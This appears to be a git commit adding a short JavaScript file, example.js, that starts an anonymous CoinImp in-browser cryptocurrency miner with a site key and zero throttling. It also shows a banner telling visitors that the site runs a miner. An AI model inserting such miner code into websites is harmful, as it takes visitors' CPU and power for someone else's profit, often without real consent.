d2520bd2ec0ff5b0c070b972bc7b8c8053c96890
darkside-community <99356964+darkside-community@users.noreply.github.com>
2022-02-28 23:04:07 +0900

    Create example.js

---
+++ js/example.js
@@ -0,0 +1,5 @@
+var _client = new Client.Anonymous('9f17605b23c48e4bef868ca648c4f7d0a39839a9d9b5cb72edc6ca04bc7a0e96', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
